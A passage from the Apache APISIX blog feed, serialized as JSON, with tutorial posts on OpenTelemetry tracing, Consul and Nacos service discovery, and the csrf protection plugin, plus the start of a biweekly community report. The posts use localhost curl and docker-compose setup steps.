Receiver port mapping\\n      - \\"55670:55679\\" # zpages extension\\n    depends_on:\\n      - jaeger-all-in-one\\n      - zipkin-all-in-one\\n\\n  demo-client:\\n    build:\\n      dockerfile: Dockerfile\\n      context: ./client\\n    environment:\\n      - OTEL_EXPORTER_OTLP_ENDPOINT=otel-collector:4317\\n      - DEMO_SERVER_ENDPOINT=http://172.17.0.1:9080/hello # APISIX address\\n    depends_on:\\n      - demo-server\\n\\n  demo-server:\\n    build:\\n      dockerfile: Dockerfile\\n      context: ./server\\n    environment:\\n      - OTEL_EXPORTER_OTLP_ENDPOINT=otel-collector:4317\\n    ports:\\n      - \\"7080:7080\\" # Map the Server port to the host\\n    depends_on:\\n      - otel-collector\\n\\n  prometheus:\\n    container_name: prometheus\\n    image: prom/prometheus:latest\\n    volumes:\\n      - ./prometheus.yaml:/etc/prometheus/prometheus.yml\\n    ports:\\n      - \\"9090:9090\\"\\n  ```\\n\\nIt should be noted that demo-client.environment.DEMO_SERVER_ENDPOINT needs to be changed to your Apache APISIX address, and ensure that it can be accessed normally in the container.\\n\\nOf course, you can also deploy Apache APISIX through `docker-compose.yaml`. For details, please refer to the [Apache APISIX official documentation](https://github.com/apache/apisix-docker/blob/master/docs/en/latest/example.md).\\n\\n#### Step 3: Test\\n\\nAfter the redeployment is completed, you can access the Jaeger UI or Zipkin UI to see that the Span of APISIX is included in the Trace, as shown below:\\n\\n![error/Jaeger example.png](https://static.apiseven.com/202108/1646045290844-acfa071b-5a0d-4f7a-aa77-55838a3cb9f6.png)\\n\\n![error/Zipkin example.png](https://static.apiseven.com/202108/1646045376329-e1344754-58b4-4a73-8aea-50e6a04f3b70.png)\\n\\n## Disable Plugin\\n\\nIf you do not need trace collection of a route temporarily, you only need to modify the route configuration and delete the related configuration of `opentelemetry` under `plugins` in the configuration.\\n\\nYou can only remove the configuration of the `opentelemetry` global plugin if you enabled it globally by binding Global Rules.\\n\\n## Summary\\n\\nAfter Apache APISIX integrates OpenTelemetry, it can easily connect with most mainstream Trace systems on the market with the help of OpenTelemetry\'s rich plug-ins. In addition, Apache APISIX has also implemented SkyWalking and Zipkin native standard protocol plug-ins, and is also actively cooperating with major communities to create a more powerful ecosystem.\\n\\nApache APISIX is also currently working on additional plugins to support integration with more services, so if you\'re interested, feel free to start a discussion thread in our GitHub Discussion or communicate via the mailing list.\\n\\n## Related articles\\n\\n- [The observability of Apache APISIX](https://apisix.apache.org/blog/2021/11/04/skywalking/)\\n\\n- [Integrating Splunk HTTP Event Collector with API Gateway](https://apisix.apache.org/blog/2022/02/10/apisix-splunk-integration/)"},{"id":"How to Integrate API Gateway and Consul?","metadata":{"permalink":"/blog/2022/02/25/consul-api-gateway","source":"@site/blog/2022/02/25/consul-api-gateway.md","title":"How to Integrate API Gateway and Consul?","description":"Apache APISIX supports the Consul KV-based service discovery registry. This article will walk you through the process of implementing service discovery and service registry in APISIX.","date":"2022-02-25T00:00:00.000Z","formattedDate":"February 25, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.415,"truncated":true,"authors":[{"name":"Tao Yang","title":"Author","url":"https://github.com/SkyeYoung","image_url":"https://github.com/SkyeYoung.png","imageURL":"https://github.com/SkyeYoung.png"},{"name":"Yilin Zeng","title":"Technical Writer","url":"https://github.com/yzeng25","image_url":"https://github.com/yzeng25.png","imageURL":"https://github.com/yzeng25.png"}],"prevItem":{"title":"Upgrade of observability capabilities, API Gateway Apache APISIX integrates OpenTelemetry","permalink":"/blog/2022/02/28/apisix-integration-opentelemetry-plugin"},"nextItem":{"title":"API Gateway Enhances Security by CSRF Plugin","permalink":"/blog/2022/02/23/csrf-api-gateway"}},"content":"> Apache APISIX supports the Consul KV-based service discovery registry. This article will walk you through the process of implementing service discovery and service registry in Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\n## Background Information\\n\\nApache APISIX is a dynamic, real-time, high-performance API gateway.\\n\\nAPISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more.\\n\\nConsul is a service mesh solution. One of its cores, Consul KV, is a distributed key-value database whose primary purpose is to store configuration parameters and metadata, while also allowing users to store indexed objects.\\n\\nIn the microservice architecture model, when the upstream services change due to capacity expansion, hardware failure, etc., the way to maintain the upstream service information by manually writing the configuration can lead to a steep increase in maintenance cost. In response, Apache APISIX provides a service discovery registry to dynamically obtain the latest service instance information to reduce the maintenance cost for users.\\n\\nCurrently, Apache APISIX supports the Consul KV-based service discovery registry with the `consul_kv` module contributed by the community.\\n\\n## How It Works\\n\\nApache APISIX leverages the `consul_kv` module of the Consul KV distributed key-value storage capability to decouple the provider and consumer of a service and implement the two core functions of a service discovery registry.\\n\\n1. Service registration: Service providers register their services with the registry.\\n2. Service Discovery: Service consumers find the routing information of service providers through the registry.\\n\\nBuilt on this foundation, Apache APISIX will be more flexible and adaptable to existing microservice architectures to better meet user needs.\\n\\n![APISIX Consul Integration](https://static.apiseven.com/202108/1645769130815-f23e9e11-ca57-4262-9083-aab5509aa178.png)\\n\\n## How to Enable Consul in Apache APISIX\\n\\nThe test environments in this article are built in Docker using docker-compose.\\n\\n1. Download Apache APISIX.\\n\\n  ```shell\\n  # Pull the Git repository of apisix-docker\\n  git clone https://github.com/apache/apisix-docker.git\\n  ```\\n\\n2. Create Consul folder and configuration files.\\n\\n  ```shell\\n  # Create Consul folder\\n  mkdir -p ~/docker-things/consul/ && cd \\"$_\\"\\n  # Create configuration files\\n  touch docker-compose.yml server1.json\\n  ```\\n\\n3. Edit the `docker-compose.yml` file.\\n\\n  ```yaml\\n  version: \'3.8\'\\n\\n  services:\\n    consul-server1:\\n      image: consul:1.9.3\\n      container_name: consul-server1\\n      restart: always\\n      volumes:\\n        - ./server1.json:/consul/config/server1.json:ro\\n      networks:\\n        - apisix\\n      ports:\\n        - \'8500:8500\'\\n      command: \'agent -bootstrap-expect=1\'\\n\\n  networks:\\n    apisix:\\n      external: true\\n      name: example_apisix\\n  ```\\n\\n4. Edit the `server1.json` file.\\n\\n  ```json\\n  {\\n    \\"node_name\\": \\"consul-server1\\",\\n    \\"server\\": true,\\n    \\"addresses\\": {\\n      \\"http\\": \\"0.0.0.0\\"\\n    }\\n  }\\n  ```\\n\\n5. Add Consul-related configuration information to the Apache APISIX configuration file `apisix_conf/config.yaml`.\\n\\n  ```yaml\\n  # config.yml\\n  # ...other config\\n  discovery:\\n    consul_kv:\\n      servers:\\n        - \\"http://consul-server1:8500\\"\\n      prefix: \\"upstreams\\"\\n  ```\\n\\n6. Start Apache APISIX and Consul.\\n\\n  ```shell\\n  # Go to the example, consul folder, start APISIX and Consul\\n  docker-compose up -d\\n  ```\\n\\n7. Register the test service to Consul. example contains two web services that you can use directly to test.\\n\\n  ```shell\\n  # Check the docker-compose.yml of the example\\n  # You can see two Web services\\n  $ cat docker-compose.yml | grep web\\n  # Outputs\\n  web1:\\n    - ./upstream/web1.conf:/etc/nginx/nginx.conf\\n  web2:\\n    - ./upstream/web2.conf:/etc/nginx/nginx.conf\\n  ```\\n\\n8. Confirm the IP addresses of these Web services.\\n\\n  ```shell\\n  $ sudo docker inspect -f=\'{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}\' $(sudo docker ps -aq) | grep web\\n  # Outputs\\n  /example-web1-1 - 172.26.0.7\\n  /example-web2-1 - 172.26.0.2\\n  ```\\n\\n9. Make a request to Consul\'s HTTP API in the terminal to register the test service.\\n  \\n  ```shell\\n  # Register with the corresponding IP\\n  curl \\\\\\n    -X PUT \\\\\\n    -d \' {\\"weight\\": 1, \\"max_fails\\": 2, \\"fail_timeout\\": 1}\' \\\\\\n    http://127.0.0.1:8500/v1/kv/upstreams/webpages/172.26.0.7:80\\n\\n  curl \\\\\\n    -X PUT \\\\\\n    -d \' {\\"weight\\": 1, \\"max_fails\\": 2, \\"fail_timeout\\": 1}\' \\\\\\n    http://127.0.0.1:8500/v1/kv/upstreams/webpages/172.26.0.2:80\\n  ```\\n  \\n  The path after `/v1/kv/` follows the format `{Prefix}/{Service Name}/{IP}:{Port}`.\\n  \\n  `{Prefix}` is the prefix written when configuring Consul in APISIX, while `{Service Name}` and `{IP}:{Port}` need to be determined by the user according to the upstream service.\\n  \\n  The format of the data is `{\\"weight\\": <Num>, \\"max_fails\\": <Num>, \\"fail_timeout\\": <Num>}`.\\n\\n10. Check whether the test service is registered successfully.\\n\\n  ```shell\\n  $ curl \\"http://127.0.0.1:8500/v1/kv/upstreams/webpages?keys\\"\\n  ```\\n\\n  The following return message indicates successful registration.\\n\\n  ```shell\\n  [\\"upstreams/webpages/172.26.0.2:80\\",\\"upstreams/webpages/172.26.0.7:80\\"]%\\n  ```\\n\\n### Create a Route and Enable Consul\\n\\nAdd Consul to the route using the Admin API provided by Apache APISIX.\\n\\nThe `X-API-KEY` and `upstream.service_name` need to be determined before adding them.\\n\\n- `X-API-KEY`: For the Admin API access token, in this example, we use the default `edd1c9f034335f136f87ad84b625c8f1`.\\n- `upstream.service_name`: The name of the upstream service, which specifies the service in a registry that will be bound to a route, should be set to the URL used to register the test service when using Consul, and the `{IP}:{Port}` part should be removed at the end. We can also use the Memory Dump API provided by Apache APISIX to get the URL of the service and confirm whether the upstream service is discovered properly.\\n\\n```shell\\n$ curl http://127.0.0.1:9092/v1/discovery/consul_kv/dump | jq\\n# Output\\n{\\n  \\"services\\": {\\n    # This key is the required URL\\n    \\"http://consul-server1:8500/v1/kv/upstreams/webpages/\\": [\\n      {\\n        \\"port\\": 80,\\n        \\"host\\": \\"172.26.0.7\\",\\n        \\"weight\\": 1\\n      },\\n      {\\n        \\"port\\": 80,\\n        \\"host\\": \\"172.26.0.2\\",\\n        \\"weight\\": 1\\n      }\\n    ]\\n  },\\n  \\"config\\": {\\n    # ...configs\\n  }\\n}\\n```\\n\\n### Add a Route\\n\\nHere the request with URL `/consul/*` is routed to `http://consul-server1:8500/v1/kv/upstreams/webpages/`. Also, the `discovery_type` must be set to `consul_kv` to start the corresponding module.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X POST -d \'\\n{\\n    \\"uri\\": \\"/consul/*\\",\\n    \\"upstream\\": {  \\n        \\"service_name\\": \\"http://consul-server1:8500/v1/kv/upstreams/webpages/\\",\\n        \\"type\\": \\"roundrobin\\",\\n        \\"discovery_type\\": \\"consul_kv\\"\\n    }\\n}\'\\n```\\n\\n### Test and Verify the Result\\n\\nThe request results show that the new route in Apache APISIX has been able to find the correct service address through Consul and request it to both nodes based on the load balancing policy.\\n\\n```shell\\n# the first request\\ncurl -s http://127.0.0.1:9080/consul/\\n# Output\\nhello web1%\\n\\n# the second request\\ncurl -s http://127.0.0.1:9080/consul/\\n# Output\\nhello web2%\\n\\n# Note: It is also possible that both requests will return\\n#       the same result as web1 or web2.\\n#       This is caused by the nature of load balancing and\\n#       you can try to make more requests.\\n```\\n\\n## Summary\\n\\nThe first half of this article describes how Apache APISIX works with Consul to implement the Consul KV-based service discovery registry to solve the problem of service information management and maintenance. The second half of this article focuses on how to use Apache APISIX in Docker with Consul. Of course, the application in the actual scenario needs to be analyzed according to the business scenario and the existing system architecture.\\n\\nMore instructions on using the Consul registry in Apache APISIX can be found in the [official documentation](https://apisix.apache.org/docs/apisix/discovery/consul_kv/).\\n\\nApache APISIX is also currently working on additional plugins to support the integration of additional services, so if you are interested, feel free to start a discussion in [GitHub Discussion](https://github.com/apache/apisix/discussions), or via the [mailing list](https://apisix.apache.org/docs/general/join) to communicate."},{"id":"API Gateway Enhances Security by CSRF Plugin","metadata":{"permalink":"/blog/2022/02/23/csrf-api-gateway","source":"@site/blog/2022/02/23/csrf-api-gateway.md","title":"API Gateway Enhances Security by CSRF Plugin","description":"This article introduces `csrf`, the CSRF security plugin for API Gateway, and details how to secure your API information in APISIX with the help of the `csrf` plugin.","date":"2022-02-23T00:00:00.000Z","formattedDate":"February 23, 2022","tags":[{"label":"Plugins","permalink":"/blog/tags/plugins"},{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.095,"truncated":true,"authors":[{"name":"Yuan Bao","title":"Author","url":"https://github.com/Baoyuantop","image_url":"https://github.com/Baoyuantop.png","imageURL":"https://github.com/Baoyuantop.png"},{"name":"Yilin Zeng","title":"Technical Writer","url":"https://github.com/yzeng25","image_url":"https://github.com/yzeng25.png","imageURL":"https://github.com/yzeng25.png"}],"prevItem":{"title":"How to Integrate API Gateway and Consul?","permalink":"/blog/2022/02/25/consul-api-gateway"},"nextItem":{"title":"The practice of Nacos service discovery on API Gateway","permalink":"/blog/2022/02/21/nacos-api-gateway"}},"content":"> This article introduces `csrf`, the CSRF security plugin for Apache APISIX, and details how to secure your API information in Apache APISIX with the help of the `csrf` plugin.\\n\\n\x3c!--truncate--\x3e\\n\\nThe key point of launching a cross-site request forgery attack is to make the target server unable to distinguish whether the source of many requests is a real user or an attacker. The general flow of the attack is that first the attacker will lure the user to navigate to a web page provided by the attacker. This page contains a request that is automatically sent to the target server. The page then loads normally and the request is automatically sent to the server. It appears to the server that the request is exactly the same as the request normally sent by the user, unaware that it was initiated by the attacker without the user\'s knowledge. Since the request carries some of the user\'s credentials, the attacker can get access to the user\'s information by parsing these credentials, thus creating a security risk.\\n\\nThis article introduces `csrf`, the CSRF security plugin for Apache APISIX, and details how to secure your API information in Apache APISIX with the help of the `csrf` plugin.\\n\\nApache APISIX is a dynamic, real-time, high-performance API gateway.\\n\\nAPISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more.\\n\\n## Plugin Introduction\\n\\nThe `csrf` plugin is implemented based on the `Double Submit Cookie` scheme. As defined in [RFC 7231#section-4.2.1](https://datatracker.ietf.org/doc/html/rfc7231.html#section-4.2.1), we consider the `GET`, `HEAD` and `OPTIONS` methods as **secure methods**. According to this convention, the `csrf` plug-in will let these three methods go directly, but will check the other methods and intercept any unsafe requests.\\n\\nTo defend against CSRF attacks, we need to create a token or identifier that cannot be forged and ensure that this is not sent with the attacker\'s request. The user needs to carry the token that the `csrf` plugin relies on in the request header, and the token is computed using a key for signing. This ensures that the token cannot be forged by others, thus securing the API.\\n\\n![Plugin workflow](https://static.apiseven.com/202108/1645605178661-7c0bc3bc-9792-43fd-b3f6-b01c0f6b24db.png)\\n\\nWhen the `csrf` plugin is enabled in a route, all request responses to that route will contain a Cookie carrying a `csrf token`.\\n\\nThe user needs to carry this Cookie in an insecure request for this route and add an additional field in the request header to carry the content of the cookie. The field is the `name` value in the plugin configuration so that the request passes the CSRF plugin\'s checks.\\n\\nThe user provides a random key in the plugin\'s configuration, which is used by the plugin to encrypt the token information with a sha256 hash and generate a CSRF token, thus ensuring that the token cannot be forged.\\n\\n## How to Use the Plugin\\n\\n### Enable CSRF Plugin in a Route\\n\\nCreate a route in APISIX using the Admin API and enable the csrf plugin.\\n\\n```shell\\ncurl -i http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n  \\"uri\\": \\"/hello\\",\\n  \\"plugins\\": {\\n    \\"csrf\\": {\\n      \\"key\\": \\"edd1c9f034335f136f87ad84b625c8f1\\"\\n    }\\n  },\\n  \\"upstream\\": {\\n    \\"type\\": \\"roundrobin\\",\\n    \\"nodes\\": {\\n      \\"127.0.0.1:9001\\": 1\\n    }\\n  }\\n}\'\\n```\\n\\nThere are three configuration parameters for the plugin.\\n\\n- `key`: Required field, the value of the random secret key. The user needs to provide a random key.\\n- `expires`: Optional, the expiration time of the random secret key, the default value is 7200 seconds. Since the CSRF token is sent to the client using a Cookie, this configuration is placed in the Cookie\'s configuration to control the Cookie\'s expiration time. In addition, the plugin will also calculate the time to determine whether the token expires.\\n- `name`: Optional, the name of the CSRF token, the default value is `apisix-csrf-token`.\\n\\n### Send a Request\\n\\nThe route is first accessed using a `POST` request.\\n\\n```shell\\ncurl -i http://127.0.0.1:9080/hello -X POST\\n```\\n\\nApache APISIX will intercept the request and return a `401` error. In the returned header you will find a Cookie set, which should be the default value `apisix-csrf-token=....` inside the Cookie if the name field of the plugin is not configured . This is the CSRF token generated by the CSRF plugin. In the request, you need to make sure that the request carries this Cookie and that the token is written in the request header.\\n\\n```shell\\nHTTP/1.1 401 Unauthorized\\nSet-Cookie: apisix-csrf-token= ${apisix-csrf-token};path=/;Expires=Mon, 13-Dec-21 09:33:55 GMT\\n{\\"error_msg\\":\\"no csrf token in headers\\"}\\n```\\n\\nExample of using JavaScript on the client side: reading Cookies using `js-cookie` and sending requests using `axios`.\\n\\n```JavaScript\\nconst token = Cookie.get(\'apisix-csrf-token\');\\n\\nconst instance = axios.create({\\n  headers: {\'apisix-csrf-token\': token}\\n});\\n```\\n\\nIf the token in the Cookie does not match the token in the request header, the request will be intercepted by the `csrf` plugin, as shown in the following example.\\n\\n```shell\\ncurl -i http://127.0.0.1:9080/hello -X POST -H \'apisix-csrf-token: ${apisix-csrf-token}\' -b \'apisix-csrf-token= ${apisix-csrf-token}\'\\n```\\n\\n```shell\\nHTTP/1.1 401 Unauthorized\\nSet-Cookie: apisix-csrf-token= ${apisix-csrf-token};path=/;Expires=Mon, 13-Dec-21 09:33:55 GMT\\n{\\"error_msg\\":\\"csrf token mismatch\\"}\\n```\\n\\nFinally, use `curl` to verify regular access.\\n\\n```shell\\ncurl -i http://127.0.0.1:9080/hello -X POST -H \'apisix-csrf-token: ${apisix-csrf-token}\' -b \'apisix-csrf-token= ${apisix-csrf-token}\'\\n```\\n\\n```shell\\nHTTP/1.1 200 OK\\n```\\n\\nInternally, the plugin needs to verify that the token in the Cookie matches the token carried in the request header and recalculate the signature to verify that the token is valid.\\n\\n### Disable the Plugin\\n\\nRemove the relevant configuration information for the `csrf` plugin and then send a request to update the route to deactivate the plugin.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n  \\"uri\\": \\"/hello\\",\\n  \\"upstream\\": {\\n    \\"type\\": \\"roundrobin\\",\\n    \\"nodes\\": {\\n      \\"127.0.0.1:1980\\": 1\\n    }\\n  }\\n}\'\\n```\\n\\n## Summary\\n\\nThis article describes in detail how the `csrf` plugin works and how to use it. We hope that this article can give you a clearer understanding of using the plugin to intercept CSRF attacks in Apache APISIX and facilitate its application in practical scenarios.\\n\\nApache APISIX is also currently working on additional plugins to support the integration of additional services, so if you are interested, feel free to start a discussion in [GitHub Discussion](https://github.com/apache/apisix/discussions), or via the [mailing list](https://apisix.apache.org/zh/docs/general/join) to communicate."},{"id":"The practice of Nacos service discovery on API Gateway","metadata":{"permalink":"/blog/2022/02/21/nacos-api-gateway","source":"@site/blog/2022/02/21/nacos-api-gateway.md","title":"The practice of Nacos service discovery on API Gateway","description":"This article introduces the basic concepts of Apache APISIX and Service Registry, and shows you the practice of Nacos service discovery on API Gateway.","date":"2022-02-21T00:00:00.000Z","formattedDate":"February 21, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.58,"truncated":true,"authors":[{"name":"Zhihuang Lin","title":"Author","url":"https://github.com/oil-oil","image_url":"https://avatars.githubusercontent.com/u/57465570?v=4","imageURL":"https://avatars.githubusercontent.com/u/57465570?v=4"},{"name":"Fei Han","title":"Technical Writer","url":"https://github.com/hf400159","image_url":"https://avatars.githubusercontent.com/u/97138894?v=4","imageURL":"https://avatars.githubusercontent.com/u/97138894?v=4"}],"prevItem":{"title":"API Gateway Enhances Security by CSRF Plugin","permalink":"/blog/2022/02/23/csrf-api-gateway"},"nextItem":{"title":"Biweekly Report (Feb 1 - Feb 14)","permalink":"/blog/2022/02/17/weekly-report-0214"}},"content":"> This article introduces the basic concepts of Apache APISIX and the Service Registry, and shows you the practice of Nacos service discovery on API Gateway.\\n\\n\x3c!--truncate--\x3e\\n\\n## Background Information\\n\\nApache APISIX is a dynamic, real-time, high-performance API gateway that provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more. It not only has many useful plugins, but also supports plugin dynamic change and hot swap. At the same time, when using service discovery components, you can not only use etcd, but also Eureka, Consul, and Nacos as service discovery components. This article will introduce you in detail how to configure Nacos in Apache APISIX as a service discovery component in Apache APISIX API Gateway.\\n\\n![error/Apache APISIX API Getway.png](https://static.apiseven.com/202108/1646038041730-3d9bfdd8-d2f0-41a2-84f5-cb1e1d567a86.png)\\n\\nService Registry is the core component of service management, similar to the role of directory service, and one of the most basic facilities in the microservices architecture. It is mainly used to store service information, such as service provider URL, routing information, and so on. The service registry is implemented by mapping complex service-side information to simple and understandable information for the client.\\n\\nThe core functions of the Service Registry are as follows:\\n\\n- Service registration: **Service providers** register with the **Service Registration Center**.\\n- Service discovery: **Service consumers** can find the call routing information of service providers through the registry.\\n- Health check: Ensure that service nodes registered with the service registry can be invoked normally, and avoid the waste of call resources caused by invalid nodes.\\n\\nThe registry is essentially to decouple service providers and service consumers. In the microservice system, each business service will call each other frequently, and the IP, port and other routing information of each service need to be managed uniformly. But how do you manage it? You can provide information about existing services to a unified service registry for management through the Service Registration function of the Service Registry.\\n\\nFrom the above description, you can know that the registry can help users quickly find services and service addresses through mapping. As business updates iterate, services change frequently. Clients can still pull a list of services through the service discovery function of the registry after registering new services or service downtime on the service side. If the service node of the registry changes, the registry sends a request to notify the client to pull again.\\n\\nIf the service on the server side suddenly goes down and there is no feedback to the service registry, the client can show the service side its service status by actively reporting the heartbeat at regular intervals through the health check function of the service registry. If the service status is abnormal, the service registry will be notified, and the service registry can remove the down service nodes in time to avoid waste of resources.\\n\\nApache APISIX + Nacos can centralize business-independent control of each microservice node into Apache APISIX for unified management, that is, **the ability to implement proxy and routing forwarding of interface services through Apache APISIX**. After registering various microservices on Nacos, Apache APISIX can get the list of services through the service discovery function of Nacos, and find corresponding service addresses to achieve dynamic proxy.\\n\\n![error/Principle Introduction.png](https://static.apiseven.com/202108/1645433743260-53613be6-2812-4af7-9bed-8a03014f2c69.png)\\n\\n## API Gateway Integrates Service Discovery Based on Nacos\\n\\n### Prerequisites\\n\\nThis article is based on the following environments.\\n\\n- OS: Centos 7.9.\\n- Apache APISIX 2.12.1, please refer to: [How-to-Bulid Apache APISIX](https://apisix.apache.org/docs/apisix/how-to-build).\\n- Nacos 2.0.4, please refer to: [Nacos Quick Start](https://nacos.io/zh-cn/docs/quick-start.html).\\n- Node.js, please refer to: [Node.js Installation](https://github.com/nodejs/help/wiki/Installation).\\n\\n### Step 1: Service Register\\n\\n1. Use Node.js\'s Koa framework starts a simple test service on port `3005` as [upstream](https://apisix.apache.org/docs/apisix/admin-api/).\\n\\n  ```JavaScript\\n  const Koa = require(\'koa\');\\n  const app = new Koa();\\n  \\n  app.use(async ctx => {\\n    ctx.body = \'Hello World\';\\n  });\\n  \\n  app.listen(3005);\\n  ```\\n\\n2. Register the service on the command line by requesting the Nacos Open API.\\n\\n  ```Shell\\n  curl -X POST \'http://127.0.0.1:8848/nacos/v1/ns/instance?serviceName=APISIX-NACOS&ip=127.0.0.1&port=3005&ephemeral=false\'\\n  ```\\n\\n3. After service registration, use the following command to query the current service.\\n\\n  ```Shell\\n  curl -X GET \'http://127.0.0.1:8848/nacos/v1/ns/instance/list?serviceName=APISIX-NACOS\'\\n  ```\\n\\nExamples of correct returned results are as follows:\\n\\n  ```JSON\\n  {\\n    \\"name\\": \\"DEFAULT_GROUP@@APISIX-NACOS\\",\\n    \\"groupName\\": \\"DEFAULT_GROUP\\",\\n    \\"clusters\\": \\"\\",\\n    \\"cacheMillis\\": 10000,\\n    \\"hosts\\": [\\n      {\\n        \\"instanceId\\": \\"127.0.0.1#3005#DEFAULT#DEFAULT_GROUP@@APISIX-NACOS\\",\\n        \\"ip\\": \\"127.0.0.1\\",\\n        \\"port\\": 3005,\\n        \\"weight\\": 1.0,\\n        \\"healthy\\": true,\\n        \\"enabled\\": true,\\n        \\"ephemeral\\": true,\\n        \\"clusterName\\": \\"DEFAULT\\",\\n        \\"serviceName\\": \\"DEFAULT_GROUP@@APISIX-NACOS\\",\\n        \\"metadata\\": {},\\n        \\"instanceHeartBeatInterval\\": 5000,\\n        \\"instanceHeartBeatTimeOut\\": 15000,\\n        \\"ipDeleteTimeout\\": 30000,\\n        \\"instanceIdGenerator\\": \\"simple\\"\\n      }\\n    ],\\n    \\"lastRefTime\\": 1643191399694,\\n    \\"checksum\\": \\"\\",\\n    \\"allIPs\\": false,\\n    \\"reachProtectionThreshold\\": false,\\n    \\"valid\\": true\\n  }\\n  ```\\n\\n### Step 2: Add Nacos Route\\n\\nCreate a new [route](https://apisix.apache.org/docs/apisix/admin-api/#route) using the Admin API provided by Apache APISIX. APISIX selects the service discovery type to use through the `upstream.discovery_type` field. `upstream.service_name` needs to be associated with the corresponding service name of the registry. Therefore, when creating a route, specify the service discovery type as `nacos`.\\n\\n  ```Shell\\n  curl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -i -d \'\\n  {\\n      \\"uri\\": \\"/nacos/*\\",\\n      \\"upstream\\": {\\n          \\"service_name\\": \\"APISIX-NACOS\\",\\n          \\"type\\": \\"roundrobin\\",\\n          \\"discovery_type\\": \\"nacos\\"\\n      }\\n  }\'\\n  ```\\n\\nIn the above command, the request header `X-API-KEY` is the access token of the Admin API, which can be viewed under `apisix.admin_key.key` in the `conf/config.yaml` file.\\n\\nAfter successful addition, examples of correct returned results are as follows:\\n\\n  ```JSON\\n  {\\n    \\"action\\": \\"set\\",\\n    \\"node\\": {\\n      \\"key\\": \\"\\\\/apisix\\\\/routes\\\\/1\\",\\n      \\"value\\": {\\n        \\"update_time\\": 1643191044,\\n        \\"create_time\\": 1643176603,\\n        \\"priority\\": 0,\\n        \\"uri\\": \\"\\\\/nacos\\\\/*\\",\\n        \\"upstream\\": {\\n          \\"hash_on\\": \\"vars\\",\\n          \\"discovery_type\\": \\"nacos\\",\\n          \\"scheme\\": \\"http\\",\\n          \\"pass_host\\": \\"pass\\",\\n          \\"type\\": \\"roundrobin\\",\\n          \\"service_name\\": \\"APISIX-NACOS\\"\\n        },\\n        \\"id\\": \\"1\\",\\n        \\"status\\": 1\\n      }\\n    }\\n  }\\n  ```\\n\\nIn addition, you can also pass other service related parameters in `upstream.discovery_args` to specify the namespace or group where the service is located. For details, please refer to the [official documentation](https://apisix.apache.org/docs/apisix/discovery/nacos#discovery_args).\\n\\n### Step 3: Verify Configuration Results\\n\\nUse the following command to send the request to the route to be configured.\\n\\n  ```Shell\\n  curl -i http://127.0.0.1:9080/nacos/\\n  ```\\n\\nExamples of correct returned results are as follows:\\n\\n  ```Shell\\n  HTTP/1.1 200 OK\\n  Content-Type: text/plain; charset=utf-8\\n  Content-Length: 11\\n  Connection: keep-alive\\n  Date: Thu, 27 Jan 2022 00:48:26 GMT\\n  Server: APISIX/2.12.0\\n\\n  Hello World\\n  ```\\n\\nIt can be seen from the example that the new route in Apache APISIX can find the correct service address through Nacos service discovery and respond normally.\\n\\n## Summary\\n\\nThis article introduces the concept of registry center and how Apache APISIX cooperates with Nacos to implement routing proxy based on service discovery. Users can use Apache APISIX and Nacos according to their business requirements and past technology architecture to realize the proxy and routing and forwarding capabilities of interface services.\\n\\nTo get more information about the `nacos` plugin description and full configuration list, you can refer to the [Apache APISIX\'s official documentation](https://apisix.apache.org/docs/apisix/discovery/nacos/).\\n\\nApache APISIX is also currently working on additional plugins to support the integration of additional services, so if you are interested, feel free to start a discussion in [GitHub Discussion](https://github.com/apache/apisix/discussions), or via the [mailing list](https://apisix.apache.org/zh/docs/general/join) to communicate."},{"id":"Biweekly Report (Feb 1 - Feb 14)","metadata":{"permalink":"/blog/2022/02/17/weekly-report-0214","source":"@site/blog/2022/02/17/weekly-report-0214.md","title":"Biweekly Report (Feb 1 - Feb 14)","description":"The cloud-native API gateway Apache APISIX has supported plugins such as csrf, file-logger, public-api, opentelemetry, and logging in the past two weeks.","date":"2022-02-17T00:00:00.000Z","formattedDate":"February 17, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":3.08,"truncated":true,"authors":[],"prevItem":{"title":"The practice of Nacos service discovery on API Gateway","permalink":"/blog/2022/02/21/nacos-api-gateway"},"nextItem":{"title":"How to develop plugin in API Gateway","permalink":"/blog/2022/02/16/file-logger-api-gateway"}},"content":"> From 2.1 to 2.14, 25 contributors submitted 55 commits for Apache APISIX. Thank you all for your contributions to Apache APISIX. It is your selfless contribution to make the Apache APISIX project better!\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX has grown as a community from the first day of open source and has quickly become the most active open source API gateway project in the world. These achievements cannot be achieved without the joint efforts of our community partners.\\n\\n\\"If you want to go fast, go alone.If you want to go far, go together.\\" The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community and and facilitate everyone to participate in the Apache APISIX community.\\n\\nWe have also compiled some issues suitable for newcomers to the community to participate in! If you are interested, don\'t miss it!\\n\\n## Contributor Statistics\\n\\n![Contributors List](https://static.apiseven.com/202108/1644998110059-61e68900-b2cc-442d-a20e-a3b5dfbd072d.png)\\n\\n![New Contributors](https://static.apiseven.com/202108/1644998110081-153dca10-ef36-47c7-8f99-e603af4a274d.png)\\n\\n## Good first issue\\n\\n### Issue #6197\\n\\n**Link**: https://github.com/apache/apisix/issues/6197\\n\\n**Issue description**:\\n\\nHow to current limit both in minutes and day by using plugin limit-count?\\n\\nCurrent, the plugin `limit-count` only Set a traffic limiting mode, second or minute. If I want to set seconds and minutes at the same time, plugin not support because what 